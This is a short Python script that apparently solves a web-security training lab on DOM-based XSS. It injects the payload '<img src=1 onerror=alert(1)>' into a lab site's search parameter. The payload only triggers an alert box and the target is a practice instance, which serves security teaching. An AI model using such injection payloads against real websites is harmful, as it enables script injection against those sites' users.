########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 15/11/2023
#
# Lab: DOM XSS in innerHTML sink using source location.search
#
# Steps: 1. Inject payload in the search query parameter to call the alert function
#        2. Observe that the script has been executed
#
########################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0abd009f03803040803508da007b0002.web-security-academy.net"

# payload to call the alert function
payload = "<img src=1 onerror=alert(1)>"

try:
    # fetch the page with the injected payload
    requests.get(f"{url}?search={payload}")

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Injecting payload in the search query parameter to call the alert function.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



